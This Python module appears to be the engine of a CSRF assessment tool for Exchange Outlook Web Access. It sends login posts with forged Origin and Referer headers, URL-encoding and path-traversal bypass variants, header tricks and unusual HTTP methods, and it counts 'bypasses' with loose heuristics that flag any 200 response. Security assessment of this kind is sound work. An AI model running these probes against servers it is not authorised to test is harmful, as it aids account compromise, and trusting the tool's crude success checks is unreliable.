#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CSRF Assessment Engine — core testing logic, payload building, HTTP requests.
"""

import re
import json
import logging
from typing import Dict, List, Tuple, Optional, Any

try:
    import requests
except ImportError:
    requests = None

logger = logging.getLogger("csrf_assessment")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
TIMEOUT = 15


def absolute_url(base: str, path: str) -> str:
    if re.match(r"^https?://", path, re.I):
        return path
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def extract_page_title(html: str) -> str:
    match = re.search(r"<title>([^<]+)</title>", html, re.I)
    return match.group(1).strip() if match else ""


def extract_hidden_inputs(html: str) -> Dict[str, str]:
    found: Dict[str, str] = {}
    for pattern in [
        r'<input\b[^>]*type=["\']?hidden["\']?[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>',
        r'<input\b[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?hidden["\']?[^>]*value=["\']([^"\']*)["\'][^>]*>',
    ]:
        for m in re.finditer(pattern, html, re.I):
            name, value = m.groups()
            if name not in found:
                found[name] = value
    return found


def extract_csrf_tokens(html: str) -> Dict[str, str]:
    tokens: Dict[str, str] = {}
    patterns = [
        (r'<input\b[^>]*name=["\']([^"\']*(?:csrf|token|__request|verification)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\'][^>]*type=["\']?hidden["\']?[^>]*>', "input"),
        (r'<meta\b[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\'][^>]*>', "meta"),
        (r"var\s+(?:csrf|token)\s*=\s*['\"]([^'\"]+)['\"]", "js_var"),
    ]
    for pattern, source in patterns:
        for m in re.finditer(pattern, html, re.I):
            if source == "input":
                tokens[m.group(1)] = m.group(2)
            elif source == "meta":
                tokens["csrf-token"] = m.group(1)
            elif source == "js_var":
                tokens["csrf-js"] = m.group(1)
    return tokens


def extract_csp(html: str) -> Optional[str]:
    match = re.search(
        r'<meta\s+http-equiv=["\']Content-Security-Policy["\'][^>]*content=["\']([^"\']+)["\'][^>]*>',
        html, re.I,
    )
    return match.group(1) if match else None


def detect_endpoints(target_base: str) -> List[Dict[str, Any]]:
    if requests is None:
        return []
    detected = []
    common_paths = [
        "/owa/auth.owa", "/owa/", "/ecp/", "/rpc/", "/autodiscover/",
        "/Microsoft-Server-ActiveSync", "/ews/exchange.asmx", "/api/",
        "/auth/", "/login", "/signin",
    ]
    for path in common_paths:
        url = absolute_url(target_base, path)
        try:
            r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
            if r.status_code in [200, 302, 401]:
                detected.append({
                    "path": path, "url": url,
                    "status": r.status_code,
                    "title": extract_page_title(r.text),
                })
        except Exception:
            pass
    return detected


def build_payload(config: Dict[str, Any], include_tokens: bool = True) -> Dict[str, str]:
    p: Dict[str, str] = {}

    def put(k, v):
        if v is not None and str(v) != "":
            p[k] = str(v)

    put("username", config["csrf_username"])
    put("password", config["csrf_password"])
    put(config["csrf_submit_name"], config["csrf_submit_value"])
    put("flags", config["csrf_flags"])
    put("forcedownlevel", config["csrf_forcedownlevel"])
    put("formdir", config["csrf_formdir"])
    put("trusted", config["csrf_trusted"])
    put("isUtf8", config["csrf_isutf8"])
    put("curl", config["csrf_curl"])
    put("destination", config["csrf_destination"])

    for k, v in config.get("auto_hidden", {}).items():
        if k not in p:
            p[k] = v

    if include_tokens:
        for k, v in config.get("csrf_tokens", {}).items():
            if k not in p:
                p[k] = v

    return p


def resolve_origin_and_referer(origin: Optional[str], referer: Optional[str],
                               fake_origin: str, fake_referer: str) -> Tuple[Optional[str], Optional[str]]:
    fo = origin or fake_origin
    fr = referer or fake_referer
    if not fr and fo:
        fr = fo.rstrip("/") + "/poc"
    if fo == "__NONE__":
        fo = None
    if fr == "__NONE__":
        fr = None
    return fo, fr


def http_try(method: str, url: str, headers: Optional[Dict[str, str]] = None,
             data: Optional[Any] = None, allow_redirects: bool = True) -> Tuple[int, str, str, str]:
    if requests is None:
        return (0, "", "", "requests not available")
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    try:
        r = sess.request(method=method, url=url, headers=headers or {},
                         data=data, timeout=TIMEOUT, verify=False, allow_redirects=allow_redirects)
        loc = r.url if allow_redirects else r.headers.get("Location", "")
        sc = r.headers.get("Set-Cookie", "")
        return (r.status_code, loc, sc, r.text[:200] if r.text else "")
    except Exception as e:
        return (-1, str(e), "", "")


# ---------------------------------------------------------------------------
# Test definitions
# ---------------------------------------------------------------------------

ENCODING_TESTS = [
    ("double_percent",    lambda b: b.rstrip("/") + "/%256f%2577%2561/"),
    ("encoded_slash",     lambda b: b.rstrip("/") + "/%2fowa%2f"),
    ("mixed_case_hex",    lambda b: b.rstrip("/") + "/%2FOWA%2f"),
    ("utf8_overlong_like",lambda b: b.rstrip("/") + "/%c0%afowa%2f"),
    ("double_encode",     lambda b: b.rstrip("/") + "/%252fowa%252f"),
]

PATH_TESTS = [
    ("dot_segments",       lambda b: b.rstrip("/") + "/owa/../owa/"),
    ("double_slash",       lambda b: b.rstrip("/") + "//owa//"),
    ("backslash_encoded",  lambda b: b.rstrip("/") + "/%5cowa%5c"),
    ("semicolon_path",     lambda b: b.rstrip("/") + "/owa/;param"),
    ("null_byte",          lambda b: b.rstrip("/") + "/owa/%00"),
    ("unicode_normalize",  lambda b: b.rstrip("/") + "/owa\u200c/"),
]

HEADER_TESTS = [
    ("content_type_json",     {"Content-Type": "application/json"}),
    ("content_type_text",     {"Content-Type": "text/plain"}),
    ("content_type_multipart",{"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"}),
    ("origin_capitalized",    {}),
    ("referer_capitalized",   {}),
    ("origin_null",           {"Origin": "null"}),
    ("referer_null",          {"Referer": "null"}),
    ("no_origin",             {}),
    ("no_referer",            {}),
    ("x_requested_with",      {"X-Requested-With": "XMLHttpRequest"}),
]

FETCH_METADATA_TESTS = [
    ("sec_fetch_navigate",   {"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1"}),
    ("sec_fetch_same_origin",{"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}),
    ("sec_fetch_cors",       {"Sec-Fetch-Dest": "empty",    "Sec-Fetch-Mode": "cors",     "Sec-Fetch-Site": "cross-site"}),
    ("sec_fetch_no_user",    {"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site"}),
    ("sec_fetch_nested",     {"Sec-Fetch-Dest": "iframe",   "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site"}),
    ("sec_ch_ua_mobile",     {"Sec-CH-UA-Mobile": "?1", "Sec-CH-UA-Platform": '"Windows"'}),
]

METHOD_TESTS = [
    ("OPTIONS", "OPTIONS"), ("PUT", "PUT"), ("TRACE", "TRACE"),
    ("DELETE", "DELETE"),   ("PATCH", "PATCH"),
]

PAYLOAD_VARIATIONS = [
    ("standard_form",  "application/x-www-form-urlencoded", lambda p: p),
    ("json_payload",   "application/json",                  lambda p: json.dumps(p)),
    ("multipart_form", "multipart/form-data",               lambda p: p),
]


def test_csrf_protection(config: Dict[str, Any], origin: Optional[str], referer: Optional[str],
                         include_tokens: bool = False) -> Dict[str, Any]:
    if requests is None:
        return {"status_code": 0, "final_url": "", "success": False,
                "indicators": ["requests not available"], "response_preview": ""}

    fo, fr = resolve_origin_and_referer(origin, referer, config["fake_origin"], config["fake_referer"])
    url = config["cookieauth_url"]
    payload = build_payload(config, include_tokens=include_tokens)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if fo is not None:
        headers["Origin"] = fo
    if fr is not None:
        headers["Referer"] = fr

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})

    try:
        sess.get(config["get_logon_url"], timeout=TIMEOUT, verify=False, allow_redirects=True)
        r = sess.post(url, data=payload, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=True)

        result: Dict[str, Any] = {
            "status_code": r.status_code,
            "final_url": r.url,
            "success": False,
            "indicators": [],
            "response_preview": r.text[:300] if r.text else "",
        }

        if r.status_code in [200, 302]:
            if "/owa/" in r.url.lower() or "inbox" in r.text.lower() or "mailbox" in r.text.lower():
                result["success"] = True
                result["indicators"].append("Redirected to OWA interface")
            if "Set-Cookie" in r.headers and "session" in r.headers["Set-Cookie"].lower():
                result["indicators"].append("Session cookie set")
            auth_indicators = ["logout", "sign out", "welcome", "mailbox", "folders"]
            if any(ind.lower() in r.text.lower() for ind in auth_indicators):
                result["success"] = True
                result["indicators"].append("Authentication indicators found in response")

        if r.status_code in [400, 403, 419]:
            result["indicators"].append(f"Blocked by server (status {r.status_code})")
        if "csrf" in r.text.lower() or "token" in r.text.lower() or "invalid" in r.text.lower():
            result["indicators"].append("CSRF error message in response")
        if "GetLogon" in r.url or "login" in r.url.lower():
            result["indicators"].append("Redirected back to login page")

        return result
    except Exception as e:
        return {"status_code": -1, "final_url": "", "success": False,
                "indicators": [f"Exception: {e}"], "response_preview": ""}


def run_suite(config: Dict[str, Any], origin: Optional[str], referer: Optional[str]) -> Dict[str, Any]:
    fo, fr = resolve_origin_and_referer(origin, referer, config["fake_origin"], config["fake_referer"])

    results: Dict[str, Any] = {
        "origin": fo or "(none)", "referer": fr or "(none)",
        "encoding": [], "path": [], "headers": [], "fetch_metadata": [],
        "methods": [], "payloads": [],
        "summary": {"vulnerable_endpoints": 0, "total_tests": 0, "bypass_success": 0},
    }

    common_headers: Dict[str, str] = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    if fo is not None:
        common_headers["Origin"] = fo
    if fr is not None:
        common_headers["Referer"] = fr

    for name, builder in ENCODING_TESTS:
        url = builder(config["safe_url"])
        st, loc, sc, _ = http_try("GET", url, headers=common_headers, allow_redirects=False)
        vuln = st in [200, 301, 302] and "owa" in loc.lower()
        results["encoding"].append({"case": name, "url": url, "status": st, "location": loc,
                                    "cookie": sc[:80] if sc else "", "vulnerable": vuln})
        results["summary"]["total_tests"] += 1
        if vuln:
            results["summary"]["bypass_success"] += 1

    for name, builder in PATH_TESTS:
        url = builder(config["safe_url"])
        st, loc, sc, _ = http_try("GET", url, headers=common_headers, allow_redirects=False)
        vuln = st in [200, 301, 302]
        results["path"].append({"case": name, "url": url, "status": st, "location": loc,
                                "cookie": sc[:80] if sc else "", "vulnerable": vuln})
        results["summary"]["total_tests"] += 1
        if vuln:
            results["summary"]["bypass_success"] += 1

    for name, hdrs in HEADER_TESTS:
        h = dict(common_headers)
        h.update(hdrs)
        if "Origin" not in h and fo is not None:
            h["Origin"] = fo
        st, loc, sc, _ = http_try("POST", config["authowa_url"], headers=h,
                                   data={"probe": "1"}, allow_redirects=False)
        blocked = st in [400, 403]
        results["headers"].append({"case": name, "status": st, "location": loc,
                                   "cookie": sc[:80] if sc else "", "blocked": blocked})
        results["summary"]["total_tests"] += 1
        if not blocked:
            results["summary"]["bypass_success"] += 1

    for name, hdrs in FETCH_METADATA_TESTS:
        h = dict(common_headers)
        h.update(hdrs)
        if "Origin" not in h and fo is not None:
            h["Origin"] = fo
        st, loc, sc, _ = http_try("POST", config["cookieauth_url"], headers=h,
                                   data=build_payload(config, include_tokens=False), allow_redirects=False)
        blocked = st in [403, 400]
        results["fetch_metadata"].append({"case": name, "status": st, "location": loc,
                                          "cookie": sc[:80] if sc else "", "blocked": blocked})
        results["summary"]["total_tests"] += 1
        if not blocked:
            results["summary"]["bypass_success"] += 1

    for name, method in METHOD_TESTS:
        st, loc, sc, _ = http_try(method, config["safe_url"], headers=common_headers, allow_redirects=False)
        allowed = st not in [405, 501]
        results["methods"].append({"case": name, "method": method, "status": st, "location": loc,
                                   "cookie": sc[:80] if sc else "", "allowed": allowed})
        results["summary"]["total_tests"] += 1
        if allowed and method not in ["GET", "POST"]:
            results["summary"]["bypass_success"] += 1

    for name, content_type, transform in PAYLOAD_VARIATIONS:
        h = dict(common_headers)
        h["Content-Type"] = content_type
        data = transform(build_payload(config, include_tokens=False))
        st, loc, sc, _ = http_try("POST", config["cookieauth_url"], headers=h,
                                   data=data, allow_redirects=False)
        success = st in [200, 302] and st not in [400, 403]
        results["payloads"].append({"case": name, "content_type": content_type, "status": st,
                                    "success": success, "location": loc, "cookie": sc[:80] if sc else ""})
        results["summary"]["total_tests"] += 1
        if success:
            results["summary"]["bypass_success"] += 1

    s = results["summary"]
    logger.info("Suite complete: %d/%d bypasses", s["bypass_success"], s["total_tests"])
    return results
